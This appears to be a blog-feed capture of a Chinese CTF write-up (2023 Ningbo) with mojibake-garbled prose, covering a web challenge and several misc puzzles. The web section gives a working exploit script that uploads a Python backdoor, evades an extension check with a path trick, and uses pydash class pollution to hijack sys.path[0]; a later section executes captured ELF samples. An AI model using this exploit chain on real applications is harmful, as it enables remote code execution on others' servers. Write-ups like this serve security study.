<p>å…¶ä¸­å­˜åœ¨æç¤º<code># pydash?</code>ï¼Œè¡¨ç¤ºé€šè¿‡<code>pydash</code>è®¾ç½®å±æ€§ï¼Œè€Œ<code>pydash</code>ä½ç‰ˆæœ¬å­˜åœ¨ç±»æ±¡æŸ“ï¼Œå¯ä»¥åˆ©ç”¨<code>pydash.set</code>æ¥è®¾ç½®æˆ–è¦†ç›–å±æ€§å€¼ï¼Œä¹Ÿå¯ä»¥è®¾ç½®è·¯å¾„</p>
<p>åœ¨<code>/app/get</code>è·¯ç”±ä¸­å­˜åœ¨ä¸€ä¸ª<code>import</code>çš„æ“ä½œï¼Œå½“<code>Python</code>è§£é‡Šå™¨é‡åˆ°<code>import</code>è¯­å¥æ—¶ï¼Œå®ƒä¼šåœ¨<code>sys.path</code>å˜é‡ä¸­æŒ‡å®šçš„è·¯å¾„ä¸­æœç´¢æ¨¡å—ï¼Œå…¶ä¸­<code>sys.path[0]</code>åˆ™è¡¨ç¤ºæœ€åˆè°ƒç”¨<code>Python</code>è§£é‡Šå™¨çš„è„šæœ¬æ‰€åœ¨çš„ç»å¯¹è·¯å¾„</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªåç§°ä¸º<code>backdoor</code>çš„pyæ–‡ä»¶ï¼Œå†åˆ©ç”¨<code>pydash.set</code>è¦†ç›–<code>sys.path[0]</code>çš„å€¼ï¼Œä½¿å…¶å¯»æ‰¾åŒ…æ—¶æ‰¾åˆ°æˆ‘ä»¬çš„æ¶æ„åŒ…</p>
<p>åŒæ—¶é¢˜ç›®ä¸­è¿˜å­˜åœ¨ä¸€ä¸ªwaf</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥åˆ©ç”¨<code>pydash.helpers</code>å¯¼å…¥<code>inspect</code>æ¥ç»•è¿‡</p>
<p><img src="/img/wp/2023/2023ningbo-6.png"></p>
<p>è¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œä¸Šä¼ æ—¶å¯¹<code>$type</code>è¿›è¡Œäº†æ£€æŸ¥ï¼Œä¸å…è®¸ä¸Šä¼ <code>py</code>ç±»å‹çš„æ–‡ä»¶ï¼Œä½†æ˜¯<code>$type</code>çš„å€¼æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç½®ç©º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//line 32</span><br><span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>å¦‚æœ<code>$type</code>ä¸ºç©ºï¼Œå°±ä¼šåœ¨æ–‡ä»¶å°¾åŠ ä¸€ä¸ªç‚¹ï¼Œä¾‹å¦‚<code>backdoor.py.</code></p>
<p>è¿™é‡Œå¯ä»¥ç”¨<code>file_put_contents</code>çš„ä¸€ä¸ª<code>trick</code>ç»•è¿‡ï¼Œå¦‚å›¾</p>
<p><img src="/img/wp/2023/2023ningbo-7.png"></p>
<p>ä¾‹å¦‚<code>backdoor.py/.</code>ï¼Œ<code>file_put_contents</code>ä¼šè‡ªå·²ç»™æ ‡å‡†åŒ–æˆç»å¯¹è·¯å¾„</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>shell = <span class="hljs-string">&#x27;&#x27;&#x27;import os</span><br><span class="hljs-string">def backdoor():</span><br><span class="hljs-string">    return os.popen(&quot;cat /flag&quot;).read()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    data = <span class="hljs-string">&quot;data:image/;base64,&quot;</span> + base64.b64encode(shell.encode()).decode()<br>    start = <span class="hljs-built_in">int</span>(time.time())<br>    res = requests.post(<br>        url=url+<span class="hljs-string">&quot;index.php?action=base64&amp;path=backdoor.py/&quot;</span>, data=data)<br>    end = <span class="hljs-built_in">int</span>(time.time())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end+<span class="hljs-number">2</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        data = &#123;<br>            <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;__init__.__globals__.pydash.helpers.inspect.sys.path[0]&quot;</span>,<br>            <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;/tmp/%s/&quot;</span> % (i)<br>        &#125;<br>        <span class="hljs-built_in">print</span>(data)<br>        requests.post(url=url+<span class="hljs-string">&quot;app/set&quot;</span>,json=data)<br>        res = requests.get(url=url+<span class="hljs-string">&quot;app/get&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag??&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text <span class="hljs-keyword">and</span> res.status_code != <span class="hljs-number">500</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exploit()<br></code></pre></td></tr></table></figure>





<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>zipæ³¨é‡Šï¼š<code>The art of 0 and 1, and it will remain shorter than 9.</code></p>
<p>ç”Ÿæˆå­—å…¸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">my_dict = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    bin_strings = [<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**i)]<br>    my_dict[i] = bin_strings<br><span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> my_dict.items():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dic.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> value:<br>            f.write(i+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br></code></pre></td></tr></table></figure>

<p>çˆ†ç ´å¾—åˆ°å¯†ç <code>01001101</code></p>
<p>è§£å‹å¾—åˆ°flag</p>
<h2 id="SimpleDocument"><a href="#SimpleDocument" class="headerlink" title="SimpleDocument"></a>SimpleDocument</h2><p>å›¾ç‰‡åˆ†ç¦»å‡ºä¸€ä¸ªpdfï¼Œç”¨pdfç¼–è¾‘å™¨å…¨é€‰ï¼Œå‘ç°æœ‰ä¸€ä¸ªéšè—çš„æ–‡æœ¬</p>
<p><img src="/img/wp/2023/2023ningbo-8.png"></p>
<h2 id="BeautifulImage"><a href="#BeautifulImage" class="headerlink" title="BeautifulImage"></a>BeautifulImage</h2><p>stegsolveåˆ†æï¼Œ0é€šé“è—æœ‰baseåŠ å¯†å­—ç¬¦ä¸²</p>
<p><img src="/img/wp/2023/2023ningbo-9.png"></p>
<h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h2><p>ä¸‹è½½é™„ä»¶å¾—åˆ°ä¸€ä¸ª<code>tree.py</code>ï¼Œçº¦æœ‰60wè¡Œä»£ç </p>
<p>éƒ¨åˆ†ä»£ç å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># the o mean is 0!</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0aB30386</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o02aA7B4</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">1705</span> &lt; <span class="hljs-number">2926</span>:<br>            tree_b270co58.tree_f79D6eB3(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_51o1oA3a</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_433218o8</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">1793</span> &lt; -<span class="hljs-number">5366</span>:<br>            tree_B813Fe08.tree_AaA1b735(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_2598o3do</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7C0ooB75</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">7226</span> &gt; -<span class="hljs-number">7705</span>:<br>            tree_3482o9ob.tree_0d6aDA0F(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0a351C93</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_39cD9171</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">9865</span> &lt; <span class="hljs-number">592</span>:<br>            tree_Coc29fcC.tree_22E98104(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_170EE546</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_70759F44</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">8714</span> &lt; <span class="hljs-number">4093</span>:<br>            tree_8D0oE9Cf.tree_2F7682e6(self)<br></code></pre></td></tr></table></figure>

<p>ä¸”å­˜åœ¨éƒ¨åˆ†å‡½æ•°è°ƒç”¨<code>os.system</code>ï¼Œæ‰§è¡Œçš„è¯­å¥å‡ä¸º<code>cat /*</code></p>
<p>é™¤äº†<code>os</code>å‡½æ•°å¤–ï¼Œå…¶ä»–å‡½æ•°éƒ½å­˜åœ¨ä¸€ä¸ª<code>if</code>ï¼Œåˆ¤æ–­æˆåŠŸæ—¶å¼•ç”¨ä¸‹ä¸€ä¸ªç±»</p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ast<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_91fo80eD</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7040e9o9</span>(<span class="hljs-params">self</span>):<br>       os.system(<span class="hljs-string">&#x27;cat /*&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_88eF054e</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o00o0b68</span>(<span class="hljs-params">self</span>):<br>       tree_91fo80eD.tree_7040e9o9(self)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_1a0c10D0</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_4Cc0o1Do</span>(<span class="hljs-params">self</span>):<br>       tree_88eF054e().tree_o00o0b68(self)<br></code></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç çš„å®Œæ•´åˆ©ç”¨é“¾ä¸ºï¼š<br><code>tree_1a0c10D0.tree_4Cc0o1Do() -&gt; tree_88eF054e.tree_o00o0b68() -&gt; tree_91fo80eD.tree_7040e9o9()</code></p>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†æä»£ç ï¼Œæ‰¾åˆ°æœ€ç»ˆè§¦å‘<code>os.system</code>çš„åˆ©ç”¨é“¾ï¼Œå¹¶æå–å‡ºæ¥</p>
<p>åŒæ—¶å¯¹æ‰€æœ‰<code>os.system</code>è¯­å¥æ ‡è®°æ±¡ç‚¹ï¼Œå¦‚æœé‡åˆ°<code>if</code>åˆ¤æ–­é”™è¯¯çš„ï¼Œåˆ™ç›´æ¥å–æ¶ˆæ±¡ç‚¹æ ‡è®°ï¼Œå¹¶ä¸€ç›´å¾€ä¸Šå¯»æ‰¾æœ€ç»ˆåˆ©ç”¨é“¾ï¼Œå¹¶è®°å½•ç±»åã€å‡½æ•°åå’Œå‡½æ•°å†…çš„å…·ä½“å†…å®¹</p>
<p>æ ¹æ®æç¤º<code># the o mean is 0!</code>ï¼Œæå–æ‰€æœ‰å®Œæ•´åˆ©ç”¨é“¾çš„ç±»åçš„å8ä½åå…­è¿›åˆ¶å­—ç¬¦ï¼Œå¹¶å°†oè½¬åŒ–ä¸º0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> astor<br><br><span class="hljs-comment"># è§£æPythonæ–‡ä»¶ï¼Œè·å–è¯­æ³•æ ‘</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tree.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>   source_code = file.read()<br>syntax_tree = ast.parse(source_code)<br><br><span class="hljs-comment"># åˆå§‹åŒ–ç±»åå’Œå‡½æ•°å­—å…¸</span><br>class_dict = &#123;&#125;<br><br><span class="hljs-comment"># éå†è¯­æ³•æ ‘ï¼Œè·å–ç±»å’Œå‡½æ•°å</span><br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> syntax_tree.body:<br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, ast.ClassDef):<br>       class_name = node.name<br>       class_dict[class_name] = &#123;&#125;<br>       <span class="hljs-keyword">for</span> inner_node <span class="hljs-keyword">in</span> node.body:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(inner_node, ast.FunctionDef):<br>               func_name = inner_node.name<br>               class_dict[class_name][func_name] = []<br>               <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> inner_node.body:<br>                   class_dict[class_name][func_name].append(astor.to_source(code).strip())<br><br><span class="hljs-comment"># è¾“å‡ºç»“æœ</span><br><br>class_keys = []<br><span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os.system&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(func_dict):<br>       sub = func_dict[<span class="hljs-number">1</span>][<span class="hljs-built_in">list</span>(func_dict[<span class="hljs-number">1</span>].items())[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>       <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       class_keys.append(func_dict[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> class_keys:<br>   class_key = key<br>   func_key = <span class="hljs-built_in">list</span>(class_dict[class_key])[<span class="hljs-number">0</span>]<br>   list_class = [class_key]<br>   flag = <span class="hljs-number">1</span><br>   flags = <span class="hljs-number">0</span><br>   <span class="hljs-keyword">while</span> flag != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>       flag = <span class="hljs-number">1</span><br>       flags = <span class="hljs-number">0</span><br>       <span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>           <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> func_dict[<span class="hljs-number">1</span>].items():<br>               <span class="hljs-comment"># print(func_dict[1].items(), flag)</span><br>               <span class="hljs-keyword">if</span> class_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> func_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]:<br>                   sub = code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>                   <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   flags = <span class="hljs-number">2</span><br>                   func_key = code[<span class="hljs-number">0</span>]<br>                   class_key = func_dict[<span class="hljs-number">0</span>]<br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   list_class.append(class_key)<br>                   <span class="hljs-comment"># print(list_class)</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-comment"># print(flag, flags)</span><br>           <span class="hljs-keyword">if</span> flag == -<span class="hljs-number">1</span>:<br>               flags = <span class="hljs-number">1</span><br>           <span class="hljs-keyword">if</span> flags == <span class="hljs-number">2</span>:<br>               flags = <span class="hljs-number">0</span><br>               <span class="hljs-keyword">continue</span><br>           <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>               <span class="hljs-keyword">break</span><br>   <span class="hljs-comment"># å°†å®Œæ•´åˆ©ç”¨é“¾çš„ç±»åï¼Œå»é™¤tree_ï¼Œoæ”¹ä¸º0ï¼ŒæŒ‰ç…§é¡ºåºè¾“å‡ºæˆå­—ç¬¦ä¸²</span><br>   <span class="hljs-keyword">if</span> flag != -<span class="hljs-number">1</span>:<br>       <span class="hljs-keyword">for</span> cla <span class="hljs-keyword">in</span> list_class:<br>           <span class="hljs-built_in">print</span>(cla[<span class="hljs-number">5</span>:].replace(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>       <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>æœ€ç»ˆå¾—åˆ°ä¸¤æ¡å®Œæ•´çš„åˆ©ç”¨é“¾</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">7468652070617373776f7264206973203730383532613933613336343963613736653335626138353833376566613135<br></code></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">377aBCAf271c00041373e10830000000000000006A0000000000000057Acbd47A5c4CDB728a43AF6d91D92D25519Bac7876E97909B633223d3A1d7417A3a741ddAfB0E9A7F0b25C726085149ad1da4D40104060001093000070B0100022406F1070112530f9A96C63163E0Df042FD12EC0b32431902121010001000C2A2600080a017088A4910000050119010011130066006c00610067002e0074007800740000001900140a01008B43f758BE7Ad901150601002000000000000000<br></code></pre></td></tr></table></figure>

<p>è½¬å­—ç¬¦ä¸²åå‘ç°ä¸€ä¸ªä¸º<code>7z</code>æ–‡ä»¶ï¼Œä¸€ä¸ªä¸º<code>the password is 70852a93a3649ca76e35ba85837efa15</code>ï¼Œè§£å‹å¾—åˆ°flag</p>
<h2 id="hacker-traffic"><a href="#hacker-traffic" class="headerlink" title="hacker_traffic"></a>hacker_traffic</h2><p>åœ¨ç¬¬4615æ¡æµä¸­å‘ç°flag.zip</p>
<p><img src="/img/wp/2023/2023ningbo-10.png"></p>
<p>æ³¨é‡Šå†…å®¹ï¼š<code>password is (md5(virus_file) + lhost_ip)</code></p>
<p>åŒæ—¶å‘ç°æµé‡ä¸­æœ‰å¾ˆå¤šelfæ–‡ä»¶ï¼Œä½¿ç”¨tsharkæˆ–è€…pythonæå–</p>
<p>è¿™é‡Œä½¿ç”¨binwalkï¼Œä½†æ˜¯éœ€è¦æ³¨æ„éƒ¨åˆ†binwalkç‰ˆæœ¬ä¸èƒ½æå–elfæ–‡ä»¶</p>
<p>éœ€è¦ä¿®æ”¹<code>/usr/lib/python3/dist-packages/binwalk/config/extract.conf</code>æ–‡ä»¶(ä»¥kalié»˜è®¤ä½ç½®ä¸ºä¾‹)</p>
<p><img src="/img/wp/2023/2023ningbo-11.png"></p>
<p>å…±æå–å‡º100ä¸ªelfæ–‡ä»¶ï¼Œä¸”æ¯ä¸ªelfæ–‡ä»¶è¿è¡Œåéƒ½ä¼šæ‰“å°ä¸€ä¸ªmd5å€¼</p>
<p>ä½¿ç”¨tcpdumpç›‘å¬åè¿è¡Œæ‰€æœ‰elfæ–‡ä»¶<br><code>tcpdump -tttt -s0 -X -vv -w t.pcap</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ä½¿ç”¨findå‘½ä»¤æŸ¥æ‰¾å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰çš„elfæ–‡ä»¶</span><br>elf_files=$(find . -maxdepth 1 -type f -executable -name &quot;*.elf&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ä½¿ç”¨å¾ªç¯ä¾æ¬¡æ‰§è¡Œæ¯ä¸€ä¸ªelfæ–‡ä»¶</span><br>for file in $elf_files<br>do<br>  echo &quot;Executing $file&quot;<br>  ./$file<br>done<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023ningbo-12.png"></p>
<p>åˆ†æ<code>t.pcap</code>æ–‡ä»¶ï¼Œå‘ç°åªæœ‰<code>22E7CF.elf</code>è®¿é—®äº†<code>192.168.3.201</code>è¿™ä¸ªip</p>
<p><img src="/img/wp/2023/2023ningbo-13.png"></p>
<p>å°†æ–‡ä»¶md5å’Œåœ°å€æ‹¼æ¥åè§£å‹æç¤ºå¯†ç é”™è¯¯ï¼Œæ˜¯å› ä¸ºtcpä¼ è¾“æ–‡ä»¶ä¼šæœ‰å†—ä½™ï¼Œéœ€è¦è®¡ç®—elfæ–‡ä»¶çš„çœŸæ­£å¤§å°</p>
<p>readelfè¯»æ–‡ä»¶</p>
<p><img src="/img/wp/2023/2023ningbo-14.png"></p>
<p>å¾—åˆ°</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">Start of section headers:          14736 (bytes into file)<br>Size of section headers:           64 (bytes)<br>Number of section headers:         30<br></code></pre></td></tr></table></figure>

<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://luomuxiaoxiao.com/?p=139">è®¡ç®—æœºåŸç†ç³»åˆ—ä¹‹äºŒ â€”â€”â€“ è¯¦è§£ELFæ–‡ä»¶</a></p>
<p>è®¡ç®—å¾—åˆ°<code>14736+64*30=16656å­—èŠ‚</code></p>
<p>16656å³4110(16è¿›åˆ¶)ï¼Œå°†å†—ä½™çš„æ•°æ®å»é™¤</p>
<p><img src="/img/wp/2023/2023ningbo-15.png"></p>
<p>è®¡ç®—çœŸæ­£çš„md5</p>
<p><img src="/img/wp/2023/2023ningbo-16.png"></p>
<p>æ‹¼æ¥èµ·æ¥ï¼Œå¾—åˆ°<code>0f82ecb23adc35a4a5e3d8bdabbafe15192.168.3.201</code></p>
<p>è§£å‹å¾—åˆ°ä¸€ä¸ªpyè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> secret<br>key = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_flag</span>(<span class="hljs-params">flag, key</span>):<br>    random.seed(key)<br>    table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>    random.shuffle(table)<br>    flag = [flag[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table]<br>    ascii_flag = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag]<br>    random.seed(key)<br>    xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    encrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ascii_flag]<br>    <span class="hljs-keyword">return</span> base64.b64encode(<span class="hljs-built_in">bytes</span>(encrypted_flag)).decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br><span class="hljs-built_in">print</span>(encrypt_flag(flag, key))<br><span class="hljs-comment"># VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=</span><br></code></pre></td></tr></table></figure>

<p>ä¼ªéšæœº+shuffleç”Ÿæˆsç›’è¿›è¡Œçš„ç½®æ¢å¼‚æˆ–åŠ å¯†</p>
<p>æ ¹æ®<code>key=&quot;x.x.x.x&quot;</code>å¯çŸ¥keyå°±æ˜¯ipåœ°å€ï¼Œä¸º<code>192.168.3.201</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">encrypted_flag, key</span>):<br>   random.seed(key)<br>   table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>   random.shuffle(table)<br>   <span class="hljs-comment"># è§£ç base64ç¼–ç çš„å­—ç¬¦ä¸²</span><br>   encrypted_flag = base64.b64decode(encrypted_flag.encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><br>   <span class="hljs-comment"># éšæœºç”Ÿæˆä¸€ä¸ªå¯†é’¥</span><br>   random.seed(key)<br>   xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br><br>   <span class="hljs-comment"># å¯¹åŠ å¯†åçš„ASCIIç åˆ—è¡¨è¿›è¡Œå¼‚æˆ–è¿ç®—</span><br>   decrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encrypted_flag]<br><br>   <span class="hljs-comment"># å°†å¼‚æˆ–åçš„ASCIIç åˆ—è¡¨è½¬æ¢æˆå­—ç¬¦åˆ—è¡¨</span><br>   flag = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> decrypted_flag])<br>   final_flag = [<span class="hljs-number">0</span>]*<span class="hljs-number">38</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(table)):<br>       final_flag[table[i]] = flag[i]<br><br>   <span class="hljs-comment"># è¿”å›è§£å¯†åçš„flagå­—ç¬¦ä¸²</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(final_flag)<br><br>key = <span class="hljs-string">&quot;192.168.3.201&quot;</span><br>text = <span class="hljs-string">&#x27;VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=&#x27;</span><br>flag = decrypt_flag(text, key)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
